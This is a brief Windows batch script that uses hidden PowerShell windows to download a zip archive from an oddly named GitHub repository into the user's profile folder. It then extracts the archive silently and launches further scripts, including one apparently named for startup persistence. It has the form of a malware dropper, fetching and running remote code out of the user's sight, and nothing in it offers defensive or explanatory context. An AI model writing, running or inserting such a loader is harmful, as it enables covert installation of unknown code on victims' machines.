@echo off
PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/ms.zip -OutFile '%USERPROFILE%\ms\ms.zip'"
timeout /t 40 /nobreak
PowerShell.exe -WindowStyle hidden -Command "Expand-Archive -Path 'ms\ms.zip' -DestinationPath 'ms\ms' -Force"
start "" Shortcut.bat
timeout /t 5/nobreak
start "" Startup.bat

